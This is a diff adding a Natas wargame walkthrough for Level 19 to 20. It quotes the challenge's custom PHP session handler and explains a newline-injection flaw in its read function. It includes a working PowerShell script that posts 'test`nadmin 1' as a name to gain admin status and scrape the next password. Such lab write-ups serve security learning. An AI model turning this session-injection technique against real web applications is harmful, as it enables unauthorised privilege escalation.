@@ -1704,5 +1704,249 @@ foreach ($n in 1..640) {
 TLDR:
 
 1. Hex encodes the string `ITER_NUMBER-admin`.
-2. Makes the request.
-3. If the response contains the string *You are an admin*. Uses a regex to extract the password and stops execution.
+2. Makes the request, using the hex string as cookie.
+3. If the response contains the string *"You are an admin"*. Uses a regex to extract the password and stops execution.
+
+## Level 19 ➡ Level 20
+
+At first sight it appears to be another challenge related to cookies. This time it immediately logs the user as `regular user`. The form has only one field `Your name` and a button `Change name`.
+
+- Test the form.
+- Inspect the resources. Focus on the cookie and the PHP code (provided by the page this time).
+- Find the vulnerability and understand how to exploit it.
+- Get the password.
+
+### Testing form 19
+
+Some basic tests:
+
+| Your name |         PHPSESSID          |
+| :-------: | :------------------------: |
+|   test    | eu0u0qlovt5iqhecvvo8ve9orm |
+|   natas   | ulgghj97fbir2qvtomr4p2nino |
+|   test    | u58moldlddcgo6i1krurpkd34i |
+|   natas   | 381h2ghbibi6bm4fha16rojo2t |
+
+Thoughts:
+
+- To make the cookie change I had to delete it. The submission of the form doesn't seem to affect it if it is already set.
+- There is some randomness, trying the same input after deleting the cookie give a different result.
+- Cookies for the same name don't seem to have anything in common.
+
+### Inspection 19
+
+#### Cookie inspection 19
+
+The information found about the cookie is well detailed on the [form testing](#testing-form-19). By itself doesn't give any relevant information regarding the logic that backs it up.
+
+#### PHP inspection 19
+
+This time the website provides PHP code to inspect. There is a lot of it. Lets start with the end goal:
+
+```php
+<?php
+function print_credentials() { /* {{{ */
+    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
+    print "You are an admin. The credentials for the next level are:<br>";
+    print "<pre>Username: natas21\n";
+    print "Password: <censored></pre>";
+    } else {
+    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas21.";
+    }
+}
+```
+
+The code uses the function `session_set_save_handler()` to define its own session handling functions. The defaults are:
+
+- `open($save_path, $session_name)`: opens the session storage.
+- `close()`: closes the session storage.
+- `read($id)`: reads the session data given a session id.
+- `write($id, $data)`: writes the session data given a session id.
+- `destroy($id)`: destroy session data given session id.
+- `gc($maxlifetime)`: garbage collection of old session data.
+
+The code only overwrites all of them, but only 2 are functional:
+
+- `myread($sid)`
+- `mywrite($sid, $data)`
+
+The writing operation:
+
+```php
+function mywrite($sid, $data) {
+    // $data contains the serialized version of $_SESSION
+    // but our encoding is better
+    debug("MYWRITE $sid $data");
+    // make sure the sid is alnum only!!
+    if(strspn($sid, "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-") != strlen($sid)) {
+    debug("Invalid SID");
+        return;
+    }
+    $filename = session_save_path() . "/" . "mysess_" . $sid;
+    $data = "";
+    debug("Saving in ". $filename);
+    ksort($_SESSION);
+    foreach($_SESSION as $key => $value) {
+        debug("$key => $value");
+        $data .= "$key $value\n";
+    }
+    file_put_contents($filename, $data);
+    chmod($filename, 0600);
+    return true;
+}
+```
+
+Overview:
+
+1. Check if session id is valid (only contains numbers, letters or dash).
+2. If valid, saves it into the location of the session saves, plus `"/mysess_$sid"`.
+3. Sorts the session data by keys in ascending order.
+4. Saves the sorted session data in the file previously created.
+5. The file is given permissions of read and write for the owner.
+
+The reading operation:
+
+```php
+function myread($sid) {
+    debug("MYREAD $sid");
+    if(strspn($sid, "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-") != strlen($sid)) {
+    debug("Invalid SID");
+        return "";
+    }
+    $filename = session_save_path() . "/" . "mysess_" . $sid;
+    if(!file_exists($filename)) {
+        debug("Session file doesn't exist");
+        return "";
+    }
+    debug("Reading from ". $filename);
+    $data = file_get_contents($filename);
+    $_SESSION = array();
+    foreach(explode("\n", $data) as $line) {
+        debug("Read [$line]");
+        $parts = explode(" ", $line, 2);
+        if($parts[0] != "") $_SESSION[$parts[0]] = $parts[1];
+    }
+    return session_encode() ?: "";
+}
+```
+
+Overview:
+
+1. Check if session id is valid (only contains numbers, letters or dash).
+2. If valid, opens the previously created session file and reads the data.
+3. Clears the current session data contained in `$_SESSION`.
+4. Populates `$_SESSION` with the data of the session file.
+5. Encodes and returns the `$_SESSION` array.
+
+There is two more pieces of relevant code. First:
+
+```php
+function debug($msg) { /* {{{ */
+    if(array_key_exists("debug", $_GET)) {
+        print "DEBUG: $msg<br>";
+    }
+}
+```
+
+This allows the printing of relevant information during the execution of the script. It is set by a GET request with the key `debug` set on.
+
+```http
+GET example.com/?debug=true
+```
+
+The second and last snippet of relevant code is the one that handles the input of the user:
+
+```php
+if(array_key_exists("name", $_REQUEST)) {
+    $_SESSION["name"] = $_REQUEST["name"];
+    debug("Name set to " . $_REQUEST["name"]);
+}
+```
+
+This sets the `name` value on the session to the one provided by the user.
+
+### Resolution 19
+
+#### Preparation 19
+
+First thing to do is to make use of the `debug` feature mentioned previously. The url would look something like this:
+
+```ps1
+$Uri = "http://$Username.natas.labs.overthewire.org/?debug=true"
+```
+
+Another thing to do is define two web requests, one for GET and the other for POST. The first one will allow me to inspect the debug information between operations, while the second one will allow me to change the `name` field.
+
+The session configuration (what allows me to send multiple request without changing cookies):
+
+```ps1
+$Session = New-Object Microsoft.PowerShell.Commands.WebRequestSession
+# I pick a random valid cookie (second param) so the website doesn't give me one.
+$Cookie = New-Object System.Net.Cookie("PHPSESSID", 'pnopkdt5pi9g60mrqqffk2eu5l', '/', "$Username.natas.labs.overthewire.org")
+$Session.Cookies.Add($Cookie)
+
+$Request = @{
+    Uri = $Uri
+    Method = 'GET'
+    Headers = @{ Authorization = "Basic $Creds" }
+    WebSession = $Session
+}
+```
+
+The implementations of the requests:
+
+```ps1
+function Invoke-Get {
+    $Request['Method'] = 'GET'
+    
+    return Invoke-WebRequest @Request
+}
+
+function Invoke-Post {
+    param (
+        [string]$Name
+    )
+
+    $Request['Method'] = 'POST'
+    $Request['Headers']['Content-Type'] = 'application/x-www-form-urlencoded'
+    $Request['Body'] = @{ name = $Name }
+
+    return Invoke-WebRequest @Request
+}
+```
+
+#### Session handler injection 19
+
+The key vulnerability is present on `myread()`, particularly in this part:
+
+```php
+$data = file_get_contents($filename);
+$_SESSION = array();
+foreach(explode("\n", $data) as $line) {
+    debug("Read [$line]");
+    $parts = explode(" ", $line, 2); // <== HERE
+    if($parts[0] != "") $_SESSION[$parts[0]] = $parts[1]; // <== AND HERE
+}
+```
+
+The code splits the data in new lines, without sanitization. Meaning `name test\nadmin 1`, will translate to:
+
+```php
+$_SESSION['name'] = test;
+$_SESSION['admin'] = 1;
+```
+
+The code that exploits the vulnerability is fairly simple:
+
+```ps1
+Invoke-Get | Out-Null
+Invoke-Post -Name "test`nadmin 1" | Out-Null
+$Password = (Invoke-Get | Select-String -Pattern "Password:\s*([^<]+)" | Select-Object -First 1).Matches.Groups[1]
+Write-Host -ForegroundColor Green $Password
+```
+
+Overview:
+
+1. Performs the initial GET request.
+2. Sets up the injection, escaping the newline character (PowerShell escapes characters with backtick). Then performs the POST request.
+3. Executes the last GET request, parsing the password from the response.
